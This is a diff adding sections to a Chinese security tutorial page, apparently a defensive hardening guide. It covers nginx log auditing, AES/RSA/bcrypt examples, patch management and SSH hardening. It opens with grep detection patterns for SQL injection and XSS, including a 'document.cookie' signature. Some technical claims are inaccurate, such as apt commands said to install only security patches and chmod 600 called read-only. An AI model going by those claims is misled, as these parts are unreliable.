+grep -i "union.*select\|insert.*into\|delete.*from\|or 1=1" /var/log/nginx/access.log
+# 2. 搜索包含XSS特征的请求
+grep -i "<script\|alert\|document.cookie" /var/log/nginx/access.log
+# 3. 定位攻击IP和URL
+awk '/union.*select/ {print $1, $7}' /var/log/nginx/access.log | sort | uniq -c | sort -nr
+# 4. 防护措施：配置WAF、修复代码漏洞、输入过滤与输出编码
+                </pre>
+                <h4>3. 场景3：服务器异常操作追溯</h4>
+                <pre>
+# 1. 查看sudo操作记录（用户执行高危命令）
+grep "sudo" /var/log/auth.log
+# 2. 查看定时任务变更记录
+grep "crontab" /var/log/syslog
+# 3. 查看文件修改记录（需开启auditd审计）
+ausearch -k file_changes
+# 4. 定位异常进程：结合top、ps命令查找可疑进程
+                </pre>
+                <h3>六、日志审计注意事项</h3>
+                <ul>
+                    <li>日志需长期留存（建议至少3个月），便于安全事件追溯和审计；</li>
+                    <li>重要日志（如安全日志、认证日志）应设置权限为只读（chmod 600），防止被篡改；</li>
+                    <li>生产环境建议将日志同步到独立的日志服务器，防止服务器被入侵后日志被删除；</li>
+                    <li>定期审计日志，建立基线（如正常登录IP、访问量范围），及时发现偏离基线的异常行为；</li>
+                    <li>结合安全监控工具（如ELK、Zabbix），实现日志自动化分析和告警，提升响应效率。</li>
+                </ul>
+            </div>
+
+            <!-- 数据加密教程 -->
+            <div class="tutorial-section" id="encrypt">
+                <button class="collect-btn" data-id="tutorial_9" data-title="数据加密教程"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-lock"></i> 数据加密教程（对称/非对称/哈希，全方位防护）</h2>
+                <div class="tip-info">
+                    <strong>核心价值</strong>：数据加密是保护敏感信息的最后一道防线，即使数据泄露（如数据库被拖库），攻击者也无法解读明文内容，适用于用户密码、支付信息、个人隐私等敏感数据。
+                </div>
+                <h3>一、对称加密（AES，高效加密大量数据）</h3>
+                <p>对称加密使用相同的密钥进行加密和解密，加密速度快，适合加密大量数据（如文件、数据库字段），核心算法：AES（高级加密标准），以下为实操示例，带详细注释：</p>
+                <h4>1. Linux下AES加密文件（OpenSSL，命令行）</h4>
+                <pre>
+# 1. AES-256-CBC模式加密文件（最常用，安全强度高）
+openssl enc -aes-256-cbc -salt -in sensitive.txt -out sensitive.enc -k YourStrongPassword123!
+# 注释：
+# -aes-256-cbc：加密算法和模式（256位密钥，CBC模式）
+# -salt：添加随机盐值，防止彩虹表破解
+# -in sensitive.txt：待加密的明文文件
+# -out sensitive.enc：加密后的输出文件
+# -k 密钥：加密密钥（建议复杂度高，至少12位，含大小写字母、数字、特殊字符）
+
+# 2. 更安全的方式（避免密码明文输入，使用PBKDF2密钥派生）
+openssl enc -aes-256-cbc -salt -in sensitive.txt -out sensitive.enc -pbkdf2
+# 执行后会提示输入密码，更安全
+
+# 3. AES解密文件
+openssl enc -d -aes-256-cbc -in sensitive.enc -out sensitive_dec.txt -k YourStrongPassword123!
+# -d：表示解密操作
+
+# 4. 加密目录（先压缩为tar包，再加密）
+tar -zcvf data.tar.gz /path/to/data/  # 压缩目录
+openssl enc -aes-256-cbc -salt -in data.tar.gz -out data.tar.gz.enc -pbkdf2  # 加密压缩包
+# 解密并解压
+openssl enc -d -aes-256-cbc -in data.tar.gz.enc -out data.tar.gz -pbkdf2
+tar -zxvf data.tar.gz
+                </pre>
+                <h4>2. PHP实现AES加密解密（代码级加密，Web应用常用）</h4>
+                <pre>
+<?php
+/**
+ * AES-256-CBC加密函数
+ * @param string $data 待加密的明文数据
+ * @param string $key 加密密钥（需为32位，通过hash生成）
+ * @return string 加密后的Base64编码字符串
+ */
+function aes_encrypt($data, $key) {
+    // 生成随机IV（初始化向量，AES-CBC模式必需，长度为16位）
+    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
+    // 执行AES加密（OPENSSL_RAW_DATA表示输出原始二进制数据）
+    $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
+    // 拼接IV和加密数据，Base64编码后返回（便于存储和传输）
+    return base64_encode($iv . $encrypted);
+}
+
+/**
+ * AES-256-CBC解密函数
+ * @param string $encrypted_data 加密后的Base64编码字符串
+ * @param string $key 解密密钥（与加密密钥相同）
+ * @return string 解密后的明文数据
+ */
+function aes_decrypt($encrypted_data, $key) {
+    // Base64解码
+    $data = base64_decode($encrypted_data);
+    // 获取IV长度（AES-CBC模式IV长度固定为16位）
+    $iv_length = openssl_cipher_iv_length('aes-256-cbc');
+    // 提取IV（前16位）和加密数据（剩余部分）
+    $iv = substr($data, 0, $iv_length);
+    $encrypted = substr($data, $iv_length);
+    // 执行AES解密
+    return openssl_decrypt($encrypted, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
+}
+
+// 使用示例（Web应用存储敏感数据）
+$key = hash('sha256', 'FengYeSecurity2024!', true); // 生成32位密钥（sha256哈希后取原始二进制）
+$original_data = "用户敏感数据：手机号138****1234，身份证号110****5678"; // 待加密的敏感数据
+
+// 加密
+$encrypted_data = aes_encrypt($original_data, $key);
+echo "加密后数据：" . $encrypted_data . "\n";
+
+// 解密
+$decrypted_data = aes_decrypt($encrypted_data, $key);
+echo "解密后数据：" . $decrypted_data . "\n";
+?>
+                </pre>
+                <h4>3. Java实现AES加密解密（后端服务常用）</h4>
+                <pre>
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import java.util.Base64;
+import java.security.SecureRandom;
+
+public class AESUtil {
+    // AES算法模式：AES-256-CBC
+    private static final String ALGORITHM = "AES/CBC/PKCS5Padding";
+    // 密钥长度（256位）
+    private static final int KEY_LENGTH = 256;
+    // IV长度（16位）
+    private static final int IV_LENGTH = 16;
+
+    /**
+     * 生成AES密钥（256位）
+     * @param keySeed 密钥种子（字符串）
+     * @return 256位密钥
+     */
+    private static SecretKeySpec generateKey(String keySeed) {
+        try {
+            // 使用SHA-256哈希生成32位密钥（256位）
+            byte[] keyBytes = keySeed.getBytes("UTF-8");
+            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
+            keyBytes = md.digest(keyBytes);
+            return new SecretKeySpec(keyBytes, "AES");
+        } catch (Exception e) {
+            throw new RuntimeException("生成AES密钥失败", e);
+        }
+    }
+
+    /**
+     * 生成随机IV（16位）
+     * @return 随机IV
+     */
+    private static byte[] generateIV() {
+        byte[] iv = new byte[IV_LENGTH];
+        new SecureRandom().nextBytes(iv);
+        return iv;
+    }
+
+    /**
+     * AES加密
+     * @param data 待加密明文
+     * @param keySeed 密钥种子
+     * @return Base64编码的加密结果（IV+加密数据）
+     */
+    public static String encrypt(String data, String keySeed) {
+        try {
+            SecretKeySpec key = generateKey(keySeed);
+            byte[] iv = generateIV();
+            IvParameterSpec ivSpec = new IvParameterSpec(iv);
+
+            Cipher cipher = Cipher.getInstance(ALGORITHM);
+            cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);
+
+            byte[] encryptedData = cipher.doFinal(data.getBytes("UTF-8"));
+            // 拼接IV和加密数据
+            byte[] result = new byte[iv.length + encryptedData.length];
+            System.arraycopy(iv, 0, result, 0, iv.length);
+            System.arraycopy(encryptedData, 0, result, iv.length, encryptedData.length);
+
+            return Base64.getEncoder().encodeToString(result);
+        } catch (Exception e) {
+            throw new RuntimeException("AES加密失败", e);
+        }
+    }
+
+    /**
+     * AES解密
+     * @param encryptedData Base64编码的加密数据（IV+加密数据）
+     * @param keySeed 密钥种子
+     * @return 解密后的明文
+     */
+    public static String decrypt(String encryptedData, String keySeed) {
+        try {
+            SecretKeySpec key = generateKey(keySeed);
+            byte[] resultBytes = Base64.getDecoder().decode(encryptedData);
+
+            // 提取IV（前16位）
+            byte[] iv = new byte[IV_LENGTH];
+            System.arraycopy(resultBytes, 0, iv, 0, iv.length);
+            IvParameterSpec ivSpec = new IvParameterSpec(iv);
+
+            // 提取加密数据（剩余部分）
+            byte[] encryptedBytes = new byte[resultBytes.length - iv.length];
+            System.arraycopy(resultBytes, iv.length, encryptedBytes, 0, encryptedBytes.length);
+
+            Cipher cipher = Cipher.getInstance(ALGORITHM);
+            cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
+
+            byte[] decryptedData = cipher.doFinal(encryptedBytes);
+            return new String(decryptedData, "UTF-8");
+        } catch (Exception e) {
+            throw new RuntimeException("AES解密失败", e);
+        }
+    }
+
+    // 测试
+    public static void main(String[] args) {
+        String keySeed = "FengYeSecurity2024!"; // 密钥种子（生产环境需保密）
+        String originalData = "用户敏感数据：手机号138****1234，身份证号110****5678";
+
+        String encrypted = encrypt(originalData, keySeed);
+        System.out.println("加密后：" + encrypted);
+
+        String decrypted = decrypt(encrypted, keySeed);
+        System.out.println("解密后：" + decrypted);
+    }
+}
+                </pre>
+                <h3>二、非对称加密（RSA，安全传输密钥）</h3>
+                <p>非对称加密使用公钥（公开）和私钥（保密）成对工作，公钥加密的数据仅能通过私钥解密，私钥加密的数据仅能通过公钥解密，加密速度慢，适合加密少量敏感数据（如密钥、验证码），核心算法：RSA，实操示例：</p>
+                <h4>1. 生成RSA密钥对（OpenSSL，命令行）</h4>
+                <pre>
+# 1. 生成RSA私钥（2048位，安全强度足够，4096位更安全但速度慢）
+openssl genrsa -out private.key 2048
+# 注释：生成的private.key包含公钥和私钥，需严格保密，权限设置为600（仅所有者可读可写）
+chmod 600 private.key
+
+# 2. 从私钥中提取公钥（公开给他人用于加密）
+openssl rsa -in private.key -pubout -out public.key
+# 公钥可公开，权限可设为644
+
+# 3. 生成加密后的私钥（密码保护，更安全）
+openssl genrsa -aes256 -out private_encrypted.key 2048
+# 执行后会提示设置密码，每次使用私钥时需输入密码
+
+# 4. 查看私钥信息
+openssl rsa -in private.key -text -noout
+
+# 5. 查看公钥信息
+openssl rsa -in public.key -pubin -text -noout
+                </pre>
+                <h4>2. RSA加密解密文件（OpenSSL，命令行）</h4>
+                <pre>
+# 1. 使用公钥加密文件（仅能通过对应私钥解密）
+openssl pkeyutl -encrypt -in sensitive.txt -inkey public.key -pubin -out sensitive_rsa.enc
+# 注释：
+# -encrypt：加密操作
+# -in：待加密文件
+# -inkey：指定公钥文件
+# -pubin：表示使用公钥加密
+
+# 2. 使用私钥解密文件
+openssl pkeyutl -decrypt -in sensitive_rsa.enc -inkey private.key -out sensitive_dec.txt
+# 若私钥已加密，执行后会提示输入私钥密码
+
+# 3. RSA加密大文件（先压缩，再分块加密，RSA不适合直接加密大文件）
+tar -zcvf large_data.tar.gz /path/to/large_data/  # 压缩大文件
+# 生成AES密钥（随机16位）
+openssl rand -hex 16 > aes_key.txt
+# 用AES加密压缩包
+openssl enc -aes-256-cbc -salt -in large_data.tar.gz -out large_data.tar.gz.enc -kfile aes_key.txt
+# 用RSA公钥加密AES密钥（安全传输AES密钥）
+openssl pkeyutl -encrypt -in aes_key.txt -inkey public.key -pubin -out aes_key.enc
+# 传输时发送large_data.tar.gz.enc和aes_key.enc，接收方用RSA私钥解密AES密钥，再解密文件
+                </pre>
+                <h4>3. PHP实现RSA加密解密（Web应用传输敏感数据）</h4>
+                <pre>
+<?php
+/**
+ * RSA加密函数（使用公钥加密）
+ * @param string $data 待加密明文（RSA 2048位最多加密245字节，需分段加密长数据）
+ * @param string $public_key_path 公钥文件路径
+ * @return string 加密后的Base64编码字符串
+ */
+function rsa_encrypt($data, $public_key_path) {
+    // 读取公钥文件
+    $public_key = file_get_contents($public_key_path);
+    $pub_key = openssl_pkey_get_public($public_key);
+    if (!$pub_key) {
+        throw new Exception("公钥无效");
+    }
+
+    // 执行RSA加密（OPENSSL_PKCS1_PADDING为填充方式）
+    $encrypted = '';
+    $result = openssl_public_encrypt($data, $encrypted, $pub_key, OPENSSL_PKCS1_PADDING);
+    if (!$result) {
+        throw new Exception("RSA加密失败");
+    }
+
+    // 释放资源
+    openssl_free_key($pub_key);
+    // Base64编码返回
+    return base64_encode($encrypted);
+}
+
+/**
+ * RSA解密函数（使用私钥解密）
+ * @param string $encrypted_data 加密后的Base64编码字符串
+ * @param string $private_key_path 私钥文件路径
+ * @return string 解密后的明文
+ */
+function rsa_decrypt($encrypted_data, $private_key_path) {
+    // 读取私钥文件
+    $private_key = file_get_contents($private_key_path);
+    $pri_key = openssl_pkey_get_private($private_key);
+    if (!$pri_key) {
+        throw new Exception("私钥无效");
+    }
+
+    // Base64解码
+    $encrypted = base64_decode($encrypted_data);
+    // 执行RSA解密
+    $decrypted = '';
+    $result = openssl_private_decrypt($encrypted, $decrypted, $pri_key, OPENSSL_PKCS1_PADDING);
+    if (!$result) {
+        throw new Exception("RSA解密失败");
+    }
+
+    // 释放资源
+    openssl_free_key($pri_key);
+    return $decrypted;
+}
+
+// 使用示例（Web应用传输用户支付密码）
+$public_key_path = "public.key";
+$private_key_path = "private.key";
+$original_data = "用户支付密码：666666"; // 少量敏感数据
+
+// 加密（客户端/前端使用公钥加密）
+$encrypted_data = rsa_encrypt($original_data, $public_key_path);
+echo "RSA加密后：" . $encrypted_data . "\n";
+
+// 解密（服务端使用私钥解密）
+$decrypted_data = rsa_decrypt($encrypted_data, $private_key_path);
+echo "RSA解密后：" . $decrypted_data . "\n";
+?>
+                </pre>
+                <h3>三、哈希加密（不可逆，存储密码首选）</h3>
+                <p>哈希加密是不可逆的（无法从哈希值还原明文），适合存储密码、验证文件完整性，核心算法：bcrypt、Argon2、SHA-256（不推荐单独用于密码存储），实操示例：</p>
+                <h4>1. PHP安全存储用户密码（bcrypt，首选）</h4>
+                <pre>
+<?php
+/**
+ * 生成密码哈希（bcrypt算法，自动加盐，安全稳定）
+ * @param string $password 用户明文密码
+ * @return string 加密后的哈希值（存储到数据库）
+ */
+function password_hash_bcrypt($password) {
+    // PASSWORD_DEFAULT默认使用bcrypt算法，cost为计算强度（10-12为宜，越高越安全但速度慢）
+    return password_hash($password, PASSWORD_DEFAULT, ['cost' => 12]);
+}
+
+/**
+ * 验证密码（比对明文密码和数据库存储的哈希值）
+ * @param string $input_password 用户输入的明文密码
+ * @param string $stored_hash 数据库存储的哈希值
+ * @return bool 验证结果（true=匹配，false=不匹配）
+ */
+function password_verify_bcrypt($input_password, $stored_hash) {
+    // password_verify自动处理盐值比对，无需手动提取盐值
+    return password_verify($input_password, $stored_hash);
+}
+
+/**
+ * 升级密码哈希算法（若当前哈希算法过时，自动升级）
+ * @param string $input_password 用户明文密码
+ * @param string $stored_hash 数据库存储的旧哈希值
+ * @return string|bool 新哈希值（需更新到数据库）或false（无需升级）
+ */
+function password_rehash_bcrypt($input_password, $stored_hash) {
+    if (password_needs_rehash($stored_hash, PASSWORD_DEFAULT, ['cost' => 12])) {
+        // 升级哈希算法并返回新哈希值
+        return password_hash($input_password, PASSWORD_DEFAULT, ['cost' => 12]);
+    }
+    return false;
+}
+
+// 使用示例（用户注册/登录）
+// 1. 用户注册：生成密码哈希并存储到数据库
+$user_password = "User@123456"; // 用户注册时输入的明文密码
+$password_hash = password_hash_bcrypt($user_password);
+echo "注册密码哈希：" . $password_hash . "\n";
+// 存储$password_hash到数据库users表的password字段
+
+// 2. 用户登录：验证密码
+$input_password = "User@123456"; // 用户登录时输入的明文密码
+$stored_hash = "数据库中存储的password_hash值"; // 从数据库查询
+if (password_verify_bcrypt($input_password, $stored_hash)) {
+    echo "密码验证通过，登录成功！\n";
+    // 检查是否需要升级哈希算法
+    $new_hash = password_rehash_bcrypt($input_password, $stored_hash);
+    if ($new_hash) {
+        // 更新数据库中的哈希值为$new_hash
+        echo "密码哈希已升级！\n";
+    }
+} else {
+    echo "密码错误，登录失败！\n";
+}
+?>
+                </pre>
+                <h4>2. Linux下计算文件哈希（验证文件完整性）</h4>
+                <pre>
+# 1. SHA-256哈希（常用，验证文件是否被篡改）
+sha256sum important_file.tar.gz
+# 输出格式：哈希值 文件名
+
+# 2. MD5哈希（仅用于完整性验证，不推荐用于密码存储）
+md5sum important_file.tar.gz
+
+# 3. 生成哈希校验文件（便于批量验证）
+sha256sum important_file1.tar.gz important_file2.tar.gz > file_checksum.sha256
+
+# 4. 验证文件哈希（检查文件是否完整）
+sha256sum -c file_checksum.sha256
+# 输出格式：文件名: OK（完整）/ FAILED（被篡改）
+
+# 5. bcrypt哈希密码（Linux命令行）
+htpasswd -nbBC 12 "" User@123456 | tr -d ':\n'
+# 输出bcrypt哈希值（去除前缀和冒号）
+                </pre>
+                <h3>四、数据加密核心注意事项（安全避坑）</h3>
+                <ul>
+                    <li>密钥管理是关键：对称加密的密钥、非对称加密的私钥需严格保密，避免硬编码在代码中，可存储在环境变量、密钥管理服务（如阿里云KMS）；</li>
+                    <li>选择安全算法：避免使用DES、3DES、AES-128以下、MD5、SHA-1等过时算法，优先选择AES-256、RSA-2048+/4096、bcrypt、Argon2；</li>
+                    <li>加密模式选择：AES推荐使用CBC/GCM模式（GCM更安全，支持认证），避免ECB模式（不安全）；</li>
+                    <li>加盐处理：对称加密和哈希加密需添加随机盐值，防止彩虹表破解；</li>
+                    <li>数据分段：RSA加密单个数据块大小有限（2048位RSA最多加密245字节），长数据需分段加密或结合AES加密；</li>
+                    <li>定期更新密钥：核心业务的加密密钥建议定期更换（如每6个月），更换时需平滑过渡，避免数据无法解密。</li>
+                </ul>
+            </div>
+
+            <!-- 系统补丁管理教程 -->
+            <div class="tutorial-section" id="patch">
+                <button class="collect-btn" data-id="tutorial_10" data-title="系统补丁管理教程"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-wrench"></i> 系统补丁管理教程（Linux/Windows，防御已知漏洞）</h2>
+                <div class="tip-success">
+                    <strong>核心价值</strong>：及时安装系统和软件补丁是防御已知漏洞的最有效手段，90%以上的黑客攻击利用的是未修复的已知漏洞（如Log4j、Heartbleed），补丁管理是安全防护的基础。
+                </div>
+                <h3>一、Linux系统补丁更新（Debian/Ubuntu，实操）</h3>
+                <p>Debian/Ubuntu系统通过apt命令管理软件包和补丁，以下为实操指令，带详细注释：</p>
+                <pre>
+# 1. 更新软件源列表（获取最新的软件包和补丁信息）
+apt update
+# 注释：仅更新源列表，不安装补丁
+
+# 2. 查看可更新的软件包和补丁
+apt list --upgradable
+# 输出格式：软件包名/版本号/更新源，可查看哪些软件有可用补丁
+
+# 3. 安装所有安全补丁和软件更新（推荐，生产环境建议先测试）
+apt upgrade -y
+# -y：自动确认安装，无需手动输入y
+# 注释：升级所有已安装软件包，包含安全补丁和功能更新
+
+# 4. 仅安装安全补丁（不升级功能，更稳定，生产环境首选）
+apt upgrade -y --only-upgrade -s  # -s表示模拟安装，查看将安装的补丁
+apt upgrade -y --only-upgrade     # 实际安装安全补丁
+
+# 5. 升级系统版本（如Ubuntu 20.04→22.04，含内核补丁，需谨慎）
+apt dist-upgrade -y
+# 注释：会升级内核、依赖关系复杂的软件包，可能导致兼容性问题，生产环境需先在测试机验证
+
+# 6. 清理无用软件包和缓存（节省磁盘空间）
+apt autoremove -y  # 卸载不再需要的依赖包
+apt clean          # 清理apt缓存的软件包文件
+
+# 7. 检查内核版本（内核补丁安装后需重启生效）
+uname -r
+# 查看已安装的内核版本列表
+dpkg --list | grep linux-image
+
+# 8. 重启系统（内核、核心服务补丁生效必需）
+reboot
+# 生产环境建议在非业务高峰重启，避免影响业务
+
+# 9. 禁止特定软件包更新（如需保持旧版本兼容性）
+apt-mark hold apache2  # 禁止Apache更新
+apt-mark unhold apache2  # 取消禁止，允许更新
+                </pre>
+                <h3>二、Linux系统补丁更新（CentOS/RHEL，实操）</h3>
+                <p>CentOS/RHEL系统通过yum命令管理软件包和补丁，实操指令带注释：</p>
+                <pre>
+# 1. 安装EPEL源（扩展软件源，获取更多补丁和软件包，可选）
+yum install epel-release -y
+
+# 2. 查看可更新的软件包和补丁
+yum check-update
+# 输出所有可更新的软件包，包含安全补丁
+
+# 3. 安装所有补丁和软件更新
+yum update -y
+# -y：自动确认安装
+
+# 4. 仅安装安全补丁（CentOS 7+支持，生产环境首选）
+yum update --security -y
+# 查看安全补丁详情
+yum updateinfo list security all
+
+# 5. 安装特定软件包的补丁（如仅更新Nginx）
+yum update nginx -y
+
+# 6. 清理无用软件包和缓存
+yum autoremove -y  # 卸载无用依赖包
+yum clean all      # 清理yum缓存
+
+# 7. 检查内核版本
+uname -r
+# 查看已安装的内核
+rpm -qa | grep kernel
+
+# 8. 重启系统（内核补丁生效）
+reboot
+
+# 9. 禁止特定软件包更新
+yum versionlock add apache2  # 禁止Apache更新
+yum versionlock delete apache2  # 取消禁止
+yum versionlock list  # 查看被禁止更新的软件包
+                </pre>
+                <h3>三、Windows系统补丁更新（图形化/命令行，实操）</h3>
+                <p>Windows系统通过Windows Update或命令行安装补丁，以下为两种方式的实操步骤：</p>
+                <h4>1. 图形化方式（Windows 10/11/Server）</h4>
+                <ol>
+                    <li>打开设置：按下Win+I，或通过"控制面板→系统和安全→Windows Update"；</li>
+                    <li>检查更新：点击"检查更新"，系统自动搜索可用补丁；</li>
+                    <li>安装补丁：搜索完成后，点击"下载并安装"，等待补丁下载安装（需联网）；</li>
+                    <li>重启系统：部分补丁（如内核、安全组件）需重启生效，点击"立即重启"；</li>
+                         </h4>2. 命令行方式（PowerShell，适合服务器批量操作）</h4>
+                <pre>
+# 1. 以管理员身份打开PowerShell（右键开始菜单→Windows PowerShell(管理员)）
+
+# 2. 检查可用更新
+Get-WindowsUpdate
+# 输出所有可用的补丁列表，包含补丁ID、标题、分类（安全更新/功能更新）
+
+# 3. 安装所有可用更新
+Install-WindowsUpdate -AcceptAll -AutoReboot
+# -AcceptAll：自动接受所有更新
+# -AutoReboot：安装完成后自动重启（需保存工作）
+
+# 4. 仅安装安全更新
+Get-WindowsUpdate -Category "Security Updates" | Install-WindowsUpdate -AcceptAll -AutoReboot
+
+# 5. 安装特定补丁（通过KB编号）
+Install-WindowsUpdate -KBArticleID "KB5035853" -AcceptAll
+# KB5035853为补丁编号，替换为实际需要安装的补丁编号
+
+# 6. 查看已安装的补丁
+Get-HotFix
+# 查看特定时间段安装的补丁（如近30天）
+Get-HotFix -After (Get-Date).AddDays(-30)
+
+# 7. 卸载有问题的补丁（通过KB编号）
+wusa /uninstall /kb:5035853 /quiet /norestart
+# /quiet：静默卸载，/norestart：不自动重启
+                </pre>
+                <h3>四、自动化补丁管理（企业级，高效运维）</h3>
+                <p>手动更新补丁效率低，适合单台服务器，企业级环境建议通过自动化工具实现批量更新，以下为实操方案：</p>
+                <h4>1. Linux自动化补丁（Cron定时任务）</h4>
+                <p>创建定时任务，在非业务高峰自动更新补丁，示例（Debian/Ubuntu）：</p>
+                <pre>
+# 1. 编辑crontab定时任务
+crontab -e
+# 2. 添加以下内容（每周日凌晨3点自动更新补丁，适合非业务高峰）
+0 3 * * 0 /usr/bin/apt update && /usr/bin/apt upgrade -y --only-upgrade && /usr/bin/apt autoremove -y > /var/log/patch_update.log 2>&1
+# 注释：
+# 0 3 * * 0：每周日凌晨3点执行
+# > /var/log/patch_update.log 2>&1：将输出日志保存到/var/log/patch_update.log，便于排查问题
+# CentOS/RHEL替换为：
+0 3 * * 0 /usr/bin/yum update -y --security > /var/log/patch_update.log 2>&1
+
+# 3. 查看定时任务
+crontab -l
+
+# 4. 手动测试定时任务脚本
+/bin/bash -c "/usr/bin/apt update && /usr/bin/apt upgrade -y --only-upgrade && /usr/bin/apt autoremove -y"
+                </pre>
+                <h4>2. Windows自动化补丁（组策略/GPO）</h4>
+                <p>Windows Server通过组策略（GPO）统一管理域内计算机的补丁更新，步骤：</p>
+                <ol>
+                    <li>打开组策略管理控制台：运行<code>gpmc.msc</code>；</li>
+                    <li>创建新的组策略对象（GPO）：右键域名→"创建GPO在这个域中并在此处链接它"，命名为"自动补丁更新"；</li>
+                    <li>编辑GPO：右键新创建的GPO→"编辑"，导航到"计算机配置→策略→管理模板→Windows组件→Windows Update"；</li>
+                    <li>配置自动更新：
+                        <ul>
+                            <li>启用"配置自动更新"，选择更新方式（如"4 - 自动下载并计划安装"）；</li>
+                            <li>设置计划安装时间（如每周日凌晨3点）；</li>
+                            <li>启用"自动更新检测频率"，设置检测间隔（如1天）。</li>
+                        </ul>
+                    </li>
+                    <li>应用GPO：将GPO链接到需要自动更新的组织单元（OU），域内计算机将在下次组策略刷新后应用配置。</li>
+                </ol>
+                <h4>3. 企业级补丁管理工具（适合大规模集群）</h4>
+                <ul>
+                    <li>Linux：Spacewalk、Foreman（开源），支持批量补丁部署、版本控制、合规审计；</li>
+                    <li>Windows：WSUS（Windows Server Update Services，微软官方），集中管理Windows补丁，控制更新时间和范围；</li>
+                    <li>跨平台：IBM BigFix、SolarWinds Patch Manager（商业工具），支持Linux/Windows/macOS等多系统补丁管理。</li>
+                </ul>
+                <h3>五、补丁管理核心注意事项（避坑指南）</h3>
+                <ul>
+                    <li>更新前备份：更新补丁前备份系统配置文件和核心数据，避免补丁兼容性问题导致业务中断；</li>
+                    <li>测试环境验证：生产环境补丁更新前，先在测试环境验证补丁的兼容性和稳定性，确认无问题后再部署；</li>
+                    <li>制定回滚方案：针对核心业务系统，提前制定补丁回滚方案（如卸载补丁、恢复备份），若补丁引发问题可快速恢复；</li>
+                    <li>关注安全公告：及时关注厂商安全公告（如微软MSRC、Linux内核官网），高危漏洞（如远程代码执行）需优先紧急修复；</li>
+                    <li>禁止关闭自动更新：核心服务器禁止关闭自动更新功能，可调整更新时间为非业务高峰，确保及时获取补丁；</li>
+                    <li>定期审计：定期检查服务器补丁安装情况，排查未安装的高危补丁，形成审计报告。</li>
+                </ul>
+            </div>
+
+            <!-- 服务器安全配置教程 -->
+            <div class="tutorial-section" id="server">
+                <button class="collect-btn" data-id="tutorial_11" data-title="服务器安全配置教程"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-server"></i> 服务器安全配置教程（Linux/Windows，全方位加固）</h2>
+                <div class="tip-warning">
+                    <strong>重要提示</strong>：以下配置需在测试环境验证后，再应用到生产环境，避免误配置导致服务不可用；核心原则：最小权限、关闭无用服务、强化认证、日志审计。
+                </div>
+                <h3>一、Linux服务器基础安全加固（核心配置）</h3>
+                <h4>1. 账号安全加固（禁止root登录，创建普通用户）</h4>
+                <pre>
+# 1. 创建普通用户（用于日常登录和管理，禁止root直接登录）
+useradd -m secure_user  # -m创建用户家目录
+passwd secure_user       # 设置用户密码（建议复杂度高：大小写字母+数字+特殊字符）
+
+# 2. 授予普通用户sudo权限（执行管理员命令）
+usermod -aG sudo secure_user  # Debian/Ubuntu
+usermod -aG wheel secure_user # CentOS/RHEL
+
+# 3. 验证sudo权限（切换到普通用户测试）
+su - secure_user
+sudo ls /root  # 输入普通用户密码，能执行则表示权限生效
+
+# 4. 禁用root SSH登录（编辑SSH配置文件）
+vim /etc/ssh/sshd_config
+# 修改以下配置项：
+PermitRootLogin no          # 禁用root直接登录SSH
+PasswordAuthentication yes  # 暂时保留密码登录（测试普通用户登录成功后可改为no）
+PubkeyAuthentication yes    # 启用SSH密钥登录（更安全）
+MaxAuthTries 3              # 最大认证尝试次数（防止暴力破解）
+ClientAliveInterval 300     # 5分钟无活动则断开连接
+ClientAliveCountMax 0       # 无活动直接断开，不重试
+
+# 5. 重启SSH服务使配置生效
+systemctl restart sshd      # Debian/Ubuntu/CentOS 7+
+service ssh restart         # 旧版Debian/Ubuntu
+
+# 6. 测试普通用户登录（本地终端或远程工具）
+ssh secure_user@服务器IP -p 22
+sudo -i  # 切换到root用户（需输入普通用户密码）
+                </pre>
+                <h4>2. SSH密钥登录配置（替代密码，最安全）</h4>
+                <pre>
+# 1. 客户端生成SSH密钥对（本地电脑，Windows/Linux/Mac）
+ssh-keygen -t ed25519 -C "secure_user@fengye-server"
+# 注释：
+# -t ed25519：推荐的密钥算法，比RSA更安全高效；若系统不支持，可替换为ssh-keygen -t rsa -b 4096
+# 执行后按回车，默认保存到~/.ssh/id_ed25519（私钥）和~/.ssh/id_ed25519.pub（公钥），无需设置密码（或设置密钥密码）
+
+# 2. 将公钥上传到服务器（客户端执行）
+ssh-copy-id -i ~/.ssh/id_ed25519.pub secure_user@服务器IP -p 22
+# 输入secure_user的密码，公钥将自动上传到服务器~/.ssh/authorized_keys
+
+# 3. 服务器端验证公钥配置（确保权限正确，否则密钥登录失败）
+su - secure_user
+mkdir -p ~/.ssh  # 确保.ssh目录存在
+chmod 700 ~/.ssh  # 目录权限必须为700（仅所有者可读可写可执行）
+chmod 600 ~/.ssh/authorized_keys  # 公钥文件权限必须为600（仅所有者可读可写）
+cat ~/.ssh/authorized_keys  # 查看已上传的公钥
+
+# 4. 禁用密码登录（确认密钥登录可用后）
+vim /etc/ssh/sshd_config
+PasswordAuthentication no  # 禁用密码登录，仅允许密钥登录
+systemctl restart sshd
+
+# 5. 测试密钥登录（客户端执行，无需输入密码）
+ssh secure_user@服务器IP -p 22 -i ~/.ssh/id_ed25519
+                </pre>
+                <h4>3. 关闭无用服务（减少攻击面）</h4>
+                <pre>
+# 1. 查看正在运行的服务（Debian/Ubuntu）
+systemctl list-unit-files --type=service --state=enabled
+# CentOS/RHEL
+systemctl list-unit-files --type=service --state=enabled
+
+# 2. 关闭并禁用无用服务（示例：telnet、rpcbind、cups等）
+# 关闭telnet服务
+systemctl stop telnet.socket
+systemctl disable telnet.socket
+# 关闭rpcbind服务
+systemctl stop rpcbind
+systemctl disable rpcbind
+# 关闭cups服务（打印机服务，服务器一般无需）
+systemctl stop cups
+systemctl disable cups
+
+# 3. 验证服务状态（确认已停止）
+systemctl status telnet.socket
+systemctl is-enabled telnet.socket  # 输出disabled表示已禁用
+
+# 4. 禁止无用端口监听（查看端口监听情况）
+netstat -tulpn  # 列出所有监听的TCP/UDP端口
+ss -tulpn       # 同netstat，部分系统默认无netstat，需安装：apt install net-tools
+                </pre>
